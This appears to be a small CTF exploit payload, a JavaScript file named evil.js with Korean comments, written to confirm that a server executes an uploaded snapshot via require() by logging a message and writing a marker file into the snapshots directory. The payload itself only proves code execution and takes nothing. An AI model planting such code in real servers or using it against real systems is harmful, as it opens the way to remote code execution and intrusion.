// 실행 여부 확인용 (CTF 범위 내에서만 사용)
(() => {
  try {
    console.log("[waywayback] evil.js loaded");
  } catch (_) {}

  try {
    const fs = require("fs");
    const path = require("path");
        // 보통 __dirname이 /app/snapshots 로 잡힘(서버 코드 기준)
    const snapshotsDir = __dirname;

    // 마커 파일 하나 생성: 성공하면 require() 실행이 확정
    const markerName = "MARKER_OK_" + Date.now() + ".txt";
    const markerPath = path.join(snapshotsDir, markerName);
    fs.writeFileSync(markerPath, "MARKER_OK", "utf8");

    console.log("[waywayback] wrote marker:", markerName);
  } catch (e) {
    try {
      console.log("[waywayback] marker write failed:", String(e));
    } catch (_) {}
  }
  })();
